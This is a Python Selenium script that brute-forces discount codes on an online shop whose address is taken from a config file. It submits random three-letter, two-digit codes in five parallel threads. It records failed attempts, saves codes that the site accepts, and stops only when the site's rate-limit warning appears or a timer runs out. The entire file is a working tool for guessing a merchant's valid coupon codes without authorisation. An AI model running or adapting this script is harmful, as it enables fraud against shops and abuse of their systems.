# imports
import time
from selenium.common.exceptions import NoSuchElementException
from selenium import webdriver
from selenium.webdriver.common.by import By
import random
from selenium.webdriver.chrome.service import Service as ChromeService
from threading import Thread
import config

# functions
def main():
    # specify site with search window
    url = config.target_site_url

    # specify chars
    letters = "abcdefghijklmnopqrstuvxyz"
    numbers = "0123456789"

    # specify your chrome_driver
    chrome_driver = config.chrome_driver

    # specify service and driver
    service = ChromeService(executable_path=chrome_driver)
    driver = webdriver.Chrome(service=service)

    # connect to the specified URL
    driver.get(url)

    # specify after what time you want to get out of loop, this can be deleted
    time_threshold = time.time() + 10

    while True:
        # if time is done break the loop
        if time.time() > time_threshold:
            break

        # if site has too many requests, break the loop
        warning = driver.find_element(By.TAG_NAME, "td")
        if "Too many requests from this IP." in warning.text:
            print(warning.text)
            break

        # if code was already tried, generate new code
        valid = False
        while not valid:
            random_let = random.choices(letters, k=3)
            random_num = random.choices(numbers, k=2)
            random_code = "".join(random_let + random_num)
            with open("tries.txt", mode="r") as tries:
                tries = tries.read()
            if random_code not in tries:
                valid = True

        # find elements and fill them up
        f_rabat_code = driver.find_element(By.CSS_SELECTOR, ".client_rebates_rebatecode_input")
        c_rabat_code = driver.find_element(By.CSS_SELECTOR, ".client_rebates_submit_code")
        f_rabat_code.send_keys(random_code.upper())
        c_rabat_code.click()

        # check if generated code succeeded if no, add to the tries, if yes add to correct_codes
        try:
            result_text = driver.find_element(By.CSS_SELECTOR, "div .menu_messages_warning_sub p")
            with open("tries.txt", mode="a") as tries:
                tries.write(f"{random_code.upper()}\n")
        except NoSuchElementException:
            result_text = driver.find_element(By.CSS_SELECTOR, "span[class='n67313_label_rebate_code']")
            if 'Aktívny zľavový kód:' in result_text.text:
                # code_found = True
                with open("correct_codes.txt", mode="a") as correct_codes:
                    correct_codes.write(f"{random_code.upper()}\n")
    # close the windows after break loop
    driver.quit()


# you can specify number of threads based on your CPU
for i in range(5):
    Thread(target=main).start()
